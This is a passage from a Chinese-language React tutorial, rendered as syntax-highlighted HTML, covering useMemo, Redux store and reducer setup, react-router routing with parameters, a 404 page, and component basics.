class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">hr</span> /&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">Child</span> <span class="hljs-attr">doSth</span>=<span class="hljs-string">&#123;doSth&#125;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Child</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>    )<br>&#125;<br><br>也可以使用useMemo<br>    <span class="hljs-comment">// 函数中返回函数：高阶函数</span><br>    <span class="hljs-keyword">const</span> doSth = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">setNum</span>(<span class="hljs-function"><span class="hljs-params">num</span> =&gt;</span> num + <span class="hljs-number">1</span>)<br>    &#125;, [])<br></code></pre></td></tr></table></figure><h3 id="15-React-Redux：javascript状态容器，提供可预测化的状态管理"><a href="#15-React-Redux：javascript状态容器，提供可预测化的状态管理" class="headerlink" title="15. React Redux：javascript状态容器，提供可预测化的状态管理"></a>15. React Redux：javascript状态容器，提供可预测化的状态管理</h3><p>在src下创建index.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 仓库的入口文件，写好后基本不变</span><br><br><span class="hljs-comment">// 引入reducer</span><br><br><span class="hljs-keyword">import</span> reducer <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./reducer&#x27;</span><br><br><span class="hljs-keyword">import</span> &#123; createStore &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;redux&#x27;</span><br><br><span class="hljs-keyword">const</span> store = <span class="hljs-title function_">createStore</span>(reducer)<br><br><span class="hljs-comment">// 导出仓库</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> store;<br></code></pre></td></tr></table></figure><p>再创建reducer.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 创建初始状态，并导出一个函数</span><br><br><span class="hljs-keyword">const</span> defaultSate = &#123;<br>    <span class="hljs-attr">num</span>: <span class="hljs-number">1</span><br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">reducerState</span> = (<span class="hljs-params">state = defaultSate, action</span>) =&gt; &#123;<br>    <span class="hljs-comment">// 不能直接对state进行修改，加一层深拷贝</span><br>    <span class="hljs-keyword">let</span> newState = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(state))<br>    <span class="hljs-keyword">switch</span> (action.<span class="hljs-property">type</span>) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;addNum&quot;</span>:<br>            newState.<span class="hljs-property">num</span> += action.<span class="hljs-property">value</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-attr">default</span>:<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> newState;<br>&#125;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> reducerState<br></code></pre></td></tr></table></figure><p>新建组件</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><span class="hljs-keyword">import</span> &#123; connect &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-redux&#x27;</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App13</span>(<span class="hljs-params">props</span>) &#123;<br>    <span class="hljs-keyword">return</span> (<br>        <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>数字为：&#123;props.num&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> props.addN()&#125;&gt;累加<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>    )<br>&#125;<br><span class="hljs-comment">// 状态映射：将reducer中的state映射成props</span><br><span class="hljs-comment">// 让开发者可以在组件中使用props.num去调用state中的num</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">mapStateToProps</span> = (<span class="hljs-params">state</span>) =&gt; &#123;<br>    <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-attr">num</span>: state.<span class="hljs-property">num</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">mapDispatchToProps</span> = (<span class="hljs-params">dispatch</span>) =&gt; &#123;<br>    <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-title function_">addN</span>(<span class="hljs-params"></span>) &#123;<br>            <span class="hljs-keyword">const</span> action = &#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;addNum&quot;</span>, value : <span class="hljs-number">2</span> &#125;<br>            <span class="hljs-title function_">dispatch</span>(action)<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 事件派发映射：将reducer中的事件映射成props，让开发者可以在组件中使用方法</span><br><span class="hljs-comment">// export default connect(state映射, dispatch映射)(当前组件名称)</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">connect</span>(mapStateToProps, mapDispatchToProps)(<span class="hljs-title class_">App13</span>)<br></code></pre></td></tr></table></figure><h3 id="16-路由"><a href="#16-路由" class="headerlink" title="16. 路由"></a>16. 路由</h3><p>入口文件：src&#x2F;index.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// door file</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">ReactDOM</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;react-dom&quot;</span>;<br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Router</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./router&#x27;</span><br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Provider</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-redux&#x27;</span><br><span class="hljs-keyword">import</span> store <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./store&#x27;</span><br><br><span class="hljs-title class_">ReactDOM</span>.<span class="hljs-title function_">render</span>(<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Router</span> /&gt;</span></span>,<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;root&#x27;</span>)<br>)<span class="hljs-string">``</span><span class="hljs-string">`</span><br><span class="hljs-string"></span><br><span class="hljs-string">App14.jsx</span><br><span class="hljs-string">`</span><span class="hljs-string">``</span>jsx<br><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Outlet</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-router-dom&#x27;</span><br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App14</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> (<br>        <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>App14<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">Outlet</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Outlet</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>    )<br>&#125;<br></code></pre></td></tr></table></figure><p>路由文件：新建src&#x2F;router&#x2F;index.jsx</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-comment">// 基本思路：App &gt; Home + List + Detail</span><br><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../App14&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Home</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../pages/Home&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">List</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../pages/List&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Detail</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../pages/Detail&#x27;</span><br><br><span class="hljs-comment">// BrowserRouter（history模式）不带#需要配置，HashRouter（Hash模式）带#打包后即可</span><br><br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">BrowserRouter</span>, <span class="hljs-title class_">Routes</span>, <span class="hljs-title class_">Route</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-router-dom&#x27;</span><br><br><span class="hljs-comment">// 定义一个路由</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">BaseRouter</span> = (<span class="hljs-params"></span>) =&gt; (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">BrowserRouter</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Routes</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">App</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/home&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">Home</span> /&gt;</span>&#125;&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">Route</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/list&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">List</span> /&gt;</span>&#125;&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">Route</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/detail&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">Detail</span> /&gt;</span>&#125;&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">Route</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">Route</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">Routes</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">BrowserRouter</span>&gt;</span></span><br>)<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">BaseRouter</span>;<br></code></pre></td></tr></table></figure><p>点击跳转：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Outlet</span>, <span class="hljs-title class_">Link</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-router-dom&#x27;</span><br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App14</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> (<br>        <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">Link</span> <span class="hljs-attr">to</span>=<span class="hljs-string">&quot;/home&quot;</span>&gt;</span>首页<span class="hljs-tag">&lt;/<span class="hljs-name">Link</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">Link</span> <span class="hljs-attr">to</span>=<span class="hljs-string">&quot;/list&quot;</span>&gt;</span>列表页<span class="hljs-tag">&lt;/<span class="hljs-name">Link</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">Link</span> <span class="hljs-attr">to</span>=<span class="hljs-string">&quot;/detail&quot;</span>&gt;</span>详情页<span class="hljs-tag">&lt;/<span class="hljs-name">Link</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">hr</span> /&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">Outlet</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Outlet</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>    )<br>&#125;<br></code></pre></td></tr></table></figure><p>也可以写成方法给button使用</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">const</span> <span class="hljs-title function_">goDetail</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-comment">// 跳转详情页</span><br>    <span class="hljs-title function_">navigate</span>(<span class="hljs-string">&#x27;/detail&#x27;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>携带参数：<br>斜杠也可以传参<br>在List.jsx中：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><span class="hljs-keyword">import</span> &#123; useParams &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-router-dom&#x27;</span><br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">List</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> &#123; id &#125; = <span class="hljs-title function_">useParams</span>()<br>    <span class="hljs-keyword">return</span> (<br>        <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>列表页 - &#123;id&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>    )<br>&#125;<br></code></pre></td></tr></table></figure><p>路由文件中：<code>&lt;Route path=&quot;/list/:id&quot; element=&#123;&lt;List /&gt;&#125;&gt;&lt;/Route&gt;</code><br>传参时：<code>&lt;li&gt;&lt;Link to=&quot;/list/123&quot;&gt;列表页&lt;/Link&gt;&lt;/li&gt;</code></p><p>另一种：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Home</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> [searchParams, setSearchParams] = <span class="hljs-title function_">useSearchParams</span>()<br>    <span class="hljs-keyword">let</span> id = searchParams.<span class="hljs-title function_">getAll</span>(<span class="hljs-string">&#x27;id&#x27;</span>)[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">return</span> (<br><br>        <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>主页 - &#123;id&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><br>    )<br>&#125;<br></code></pre></td></tr></table></figure><p>传参时：<code>&lt;li&gt;&lt;Link to=&quot;/home?id=456&quot;&gt;首页&lt;/Link&gt; &lt;/li&gt;</code></p><p>以上携带的数据有限，当想要携带大量数据时，比较麻烦，可以↓</p><pre><code class="hljs">const goDetail = () =&gt; &#123;    // 跳转详情页    navigate(&#39;/detail&#39;, &#123;        state: &#123; username: &#39;azure&#39; &#125;    &#125;)&#125;&lt;button onClick=&#123;goDetail&#125;&gt;跳转详情页&lt;/button&gt;</code></pre><p>在子组件定义<code>let location = useLocation()</code>来接收<br>展示：<code>&lt;div&gt;&lt;h2&gt;详情页 -- &#123;location.state ? location.state.username : &#39;&#39;&#125;&lt;/h2&gt;&lt;/div&gt;</code></p><h3 id="17-给404"><a href="#17-给404" class="headerlink" title="17. 给404"></a>17. 给404</h3><p>界面写法：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">ErrorImg</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../assets/404.jpg&#x27;</span><br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Error</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> (<br>        <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/Users/azure/Desktop/ABC/react/&#123;ErrorImg&#125;&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;404&quot;</span> /&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>    )<br>&#125;<br></code></pre></td></tr></table></figure><p>路由页：<br><code>&lt;Route path=&quot;*&quot; element=&#123;&lt;Error /&gt;&#125;&gt;&lt;/Route&gt;</code></p><blockquote><p>Ref: </p><p>react 官方网站：<a href="https://react.docschina.org/">https://react.docschina.org</a></p><p>私人教程：<a href="http://codesohigh.com/subject/reactnew/">http://codesohigh.com/subject/reactnew/</a></p><p>react-redux：<a href="https://react-redux.js.org/">https://react-redux.js.org/</a></p><p>reactrouter：<a href="https://reactrouter.com/en/main">https://reactrouter.com/en/main</a></p></blockquote><h3 id="18-元素渲染"><a href="#18-元素渲染" class="headerlink" title="18. 元素渲染"></a>18. 元素渲染</h3><p>React 元素是不可变对象。一旦被创建，你就无法更改它的子元素或者属性，更新 UI 唯一的方式是创建一个全新的元素，并将其传入 <code>ReactDOM.render()</code></p><p>考虑一个计时器实时更新的例子：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">tick</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> element = (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello, world!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>It is &#123;new Date().toLocaleTimeString()&#125;.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>  <span class="hljs-title class_">ReactDOM</span>.<span class="hljs-title function_">render</span>(element, <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;root&#x27;</span>));<br>&#125;<br><br><span class="hljs-built_in">setInterval</span>(tick, <span class="hljs-number">1000</span>);<br></code></pre></td></tr></table></figure><blockquote><p>这个例子会在 <code>setInterval()</code>回调函数，每秒都调用<code>ReactDOM.render()</code>，在实践中，大多数 React 应用只会调用一次<code>ReactDOM.render()</code>，我们可以将这些代码封装到有状态组件中。</p></blockquote><p>React DOM 会将元素和它的子元素与它们之前的状态进行比较，并只会进行必要的更新来使 DOM 达到预期的状态。尽管每一秒我们都会新建一个描述整个 UI 树的元素，React DOM 只会更新实际改变了的内容，考虑 UI 在任意给定时刻的状态，而不是随时间变化的过程，能够消灭一整类的 bug。</p><h3 id="19-组件"><a href="#19-组件" class="headerlink" title="19. 组件"></a>19. 组件</h3><p>组件允许你将 UI 拆分为独立可复用的代码片段，从概念上类似于 JavaScript 函数。它接受任意的入参（即 “props”），并返回用于描述页面展示内容的 React 元素。</p><p><strong>函数组件</strong>：接收唯一带有数据的 “props”（代表属性）对象与并返回一个 React 元素</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Welcome</span>(<span class="hljs-params">props</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span> hello, &#123; props.name &#125; <span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>class组件</strong>：与函数组件等效</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Welcome</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello, &#123;this.props.name&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当 React 元素为用户自定义组件时，它会将 JSX 所接收的属性（attributes）以及子组件（children）转换为单个对象传递给组件，这个对象被称之为 “props”。</p><p>例如，这段代码会在页面上渲染 “Hello, Sara”：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Welcome</span>(<span class="hljs-params">props</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello, &#123;props.name&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span>;<br>&#125;<br><br><span class="hljs-keyword">const</span> element = <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Welcome</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Sara&quot;</span> /&gt;</span></span>;<br><span class="hljs-title class_">ReactDOM</span>.<span class="hljs-title function_">render</span>(<br>  element,<br>  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;root&#x27;</span>)<br>);<br></code></pre></td></tr></table></figure><p><strong>提取组件</strong>：将组件拆分为更小的组件</p><p>以如下组件为例：描述一个社交媒体网站上的评论功能，它接收 <code>author</code>（对象），<code>text</code> （字符串）以及 <code>date</code>（日期）作为 props。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Comment</span>(<span class="hljs-params">props</span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span 